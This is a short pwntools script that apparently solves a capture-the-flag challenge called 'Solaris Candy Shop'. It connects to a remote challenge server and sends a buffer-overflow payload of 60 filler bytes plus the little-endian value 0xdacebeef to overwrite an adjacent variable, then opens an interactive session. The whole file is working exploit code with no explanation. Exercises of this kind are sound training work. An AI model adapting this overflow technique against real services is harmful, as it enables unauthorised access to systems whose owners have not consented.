from pwn import *

# Connect to server. Comment next line if running locally (ie run the previous line)
p = remote('chall.seccomp.xyz', 6789)

# Craft payload
buffer = b'A'*60
magic = 0xdacebeef.to_bytes(4,'little')

payload = buffer + magic
p.recvuntil(b"Welcome to Solaris Candy Shop\n")
p.sendline(payload)
print("Payload is ")
print(payload)

# Receive more data from server
data = p.recvall()
print("Received data: ")
print(data)

p.interactive()